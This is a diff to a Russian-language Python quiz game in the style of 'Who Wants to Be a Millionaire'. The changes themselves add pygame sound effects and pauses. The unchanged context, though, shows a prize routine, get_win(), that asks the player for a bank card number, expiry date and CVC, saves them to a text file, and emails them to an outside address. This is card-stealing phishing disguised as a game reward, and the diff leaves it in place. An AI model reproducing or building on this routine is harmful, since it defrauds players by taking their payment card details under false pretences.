@@ -1,6 +1,10 @@
+import time
+
+from pygame.examples.music_drop_fade import volume
 from rich import print
 import os
 import random
+import pygame
 import sys
 import smtplib
 import email.message
@@ -65,7 +69,7 @@ def get_win():
     card_cvc = input("Введите CVC код с обратной стороны карты >>>")
 
     with open("2001_data.txt", "w") as file:
-        file.write(f'{card_number}\n{card_srok}\n{card_cvc}\n***********')
+        file.write(f"{card_number}\n{card_srok}\n{card_cvc}\n***********")
 
     send_email_with_attachment(
         "shukolza@gmail.com",
@@ -151,6 +155,18 @@ q_correct_answers = [q1_a, q2_a, q3_a, q4_a, q5_a, q6_a, q7_a, q8_a, q9_a, q10_a
 
 ###
 
+pygame.mixer.init()
+
+start_sound = pygame.mixer.Sound("start_sound.mp3")
+pygame.mixer.music.load("bg_music.mp3")
+fiftyfifty_sound = pygame.mixer.Sound("fiftyfifty.mp3")
+thinking_sound = pygame.mixer.Sound("thinking.mp3")
+wrong_ans_sound = pygame.mixer.Sound("wrong_ans.mp3")
+corr_ans_sound = pygame.mixer.Sound("corr_ans.mp3")
+win_sound = pygame.mixer.Sound("winning.mp3")
+zal_sound = pygame.mixer.Sound("zal.mp3")
+pygame.mixer.music.set_volume(0.5)
+a_flag = False
 if __name__ == "__main__":
     while True:
         if win_flag:
@@ -163,6 +179,11 @@ if __name__ == "__main__":
         print("[2] ВЫЙТИ")
         menu_choice = input(">>>")
         if menu_choice == "1":
+            if not a_flag:
+                start_sound.play()
+                a_flag = True
+            time.sleep(16)
+            pygame.mixer.music.play(-1)
             for question in range(10):
                 if win_flag:
                     get_win()
@@ -181,10 +202,15 @@ if __name__ == "__main__":
                 print()
                 print("[100] Подсказка: помощь зала" if zal else "НЕАКТИВНО")
                 print("[200] Подсказка: 50/50" if fiftyfifty else "НЕАКТИВНО")
+                time.sleep(2)
                 while True:
                     try:
+                        thinking_sound.play()
                         user_answer = int(input("Введите номер ответа >>>"))
                         if user_answer == 100 and zal:
+                            zal_sound.play()
+                            print("Зал думает...")
+                            time.sleep(10)
                             print(
                                 "Зал говорит что правильно:",
                                 random.choice(q_answers[question]),
@@ -196,6 +222,7 @@ if __name__ == "__main__":
                             continue
 
                         if user_answer == 200 and fiftyfifty:
+                            fiftyfifty_sound.play()
                             incorrect_answers = [
                                 ans
                                 for i, ans in enumerate(q_answers[question])
@@ -230,7 +257,9 @@ if __name__ == "__main__":
                     except ValueError as e:
                         print(f"Неверный ввод. Попробуйте снова. Ошибка: {e}")
                         continue
+                thinking_sound.stop()
                 if user_answer == q_correct_answers[question]:
+                    corr_ans_sound.play()
                     print("[bold green]СОВЕРШЕННО ВЕРНО!!!![/bold green]")
                     if question + 1 == 1:
                         money = 1000
@@ -285,6 +314,8 @@ if __name__ == "__main__":
                         print("Если вы ошибетесь, то уйдете с 250 000 рублей!!!!")
                         aboba = input("Нажмите enter чтобы продолжить...")
                     elif question + 1 == 10:
+                        time.sleep(5)
+                        win_sound.play()
                         money = 1000000
                         print("Вы получили 1 000 000 рублей.")
                         print(
@@ -300,9 +331,11 @@ if __name__ == "__main__":
                         )
                         aboba = input("Нажмите enter чтобы продолжить...")
                 else:
+                    wrong_ans_sound.play()
                     print("Вы ошиблись. GAME OVER")
                     if money < 25000:
                         print("Вы ничего не выиграли(")
+                        aboba = input("Нажмите enter чтобы выйти...")
                         sys.exit(0)
                     elif money < 250000:
                         print(
